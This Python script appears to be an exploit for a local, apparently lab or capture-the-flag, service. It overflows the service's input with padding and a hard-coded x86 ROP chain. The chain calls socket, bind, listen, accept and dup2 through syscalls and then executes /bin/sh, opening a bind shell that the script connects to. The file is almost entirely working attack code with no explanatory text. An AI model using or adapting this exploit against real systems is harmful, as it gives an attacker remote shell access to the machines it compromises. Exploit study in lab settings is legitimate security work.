#!/usr/bin/env python

from struct import pack
import socket
import sys
import time

from console import console

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT LISTEN_PORT" % sys.argv[0])

def send_cmd(cmd):
    port = int(sys.argv[1])
    sock = socket.create_connection(('127.0.0.1', port),
                                    socket.getdefaulttimeout(),
                                    ('127.0.0.1', 0))


    sock.sendall("a"*1020)
    time.sleep(1)
    sock.sendall(cmd+"\r\n")


    sock.close()


portNum = pack('>H', int(sys.argv[2]))
pad = pack('<H', 0x0000)
p = ''


# [2,1,6]
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000002) # 2
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000001) # 1
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000006) # 1
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x0813906c) # @ .data + 12
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000066) # 0x66
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x00000001) # 1
p += pack('<I', 0x08085cbf) # int 0x80
# saving eax in memory
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139090) # @ .data3
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# [socket,Ptr,16]
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x08139070) # @ .data2
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000010) # 16
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x0813906c) # @ .data + 12
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# [2,port,127.0.0.1]
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139070) # @ .data2
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000002) # 2
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139072) # @ .data2 + 2
p += pack('<I', 0x080f1016) # pop eax ; ret
p += portNum # port
p += pad # pad
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139074) # @ .data2 + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0100007f) # 127.0.0.1
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139078) # @ .data2 + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# bind(socket,[2,port,127.0.0.1],16)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000066) # 0x66
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x00000002) # 2
p += pack('<I', 0x08085cbf) # int 0x80
#[5, 135499884]
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390a0) # @ .data4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0813908c) # @ .data3-4
p += pack('<I', 0x080c3150) # mov eax, dword ptr [eax + 4] ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390a4) # @ .data4 + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 135499884) # @ 135499884
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390a8) # @ .data4 + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# listen(5, 135499884)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x081390a0) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000066) # 0x66
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x00000004) # 4
p += pack('<I', 0x08085cbf) # int 0x80
#[5, 0, NULL]
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390b0) # @ .data5
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0813908c) # @ .data3-4
p += pack('<I', 0x080c3150) # mov eax, dword ptr [eax + 4] ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390b4) # @ .data5 + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0) # @ 0
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390b8) # @ .data5 + 8
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390bc) # @ .data5 + 12
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# accept(5, 0, NULL) 
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x081390b0) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000066) # 0x66
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x00000005) # 5
p += pack('<I', 0x08085cbf) # int 0x80
# saving eax in memory
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139090) # @ .data3
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# mov ebx, data3 ; ret
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0813908c) # @ .data3-4
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x00000000) # @ .data
p += pack('<I', 0x080c3150) # mov eax, dword ptr [eax + 4] ; ret
p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
# dup2(sock, 0);
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000003f) # 0x3f
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x00000000) # 0
p += pack('<I', 0x08085cbf) # int 0x80
# dup2(sock, 1);
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000003f) # 0x3f
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x00000001) # 1
p += pack('<I', 0x08085cbf) # int 0x80
# dup2(sock, 2);
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000003f) # 0x3f
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x00000002) # 2
p += pack('<I', 0x08085cbf) # int 0x80
# shellcode
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000000b) # 11
p += pack('<I', 0x08085cbf) # int 0x80

c = 'w'
i = 32
send_cmd(c*i+p)
time.sleep(5)

port = int(sys.argv[2])
sock = socket.create_connection(('127.0.0.1', port),
                            socket.getdefaulttimeout(),
                            ('127.0.0.1', 0))
console(sock)

# :vim set sw=4 ts=8 sts=8 expandtab:
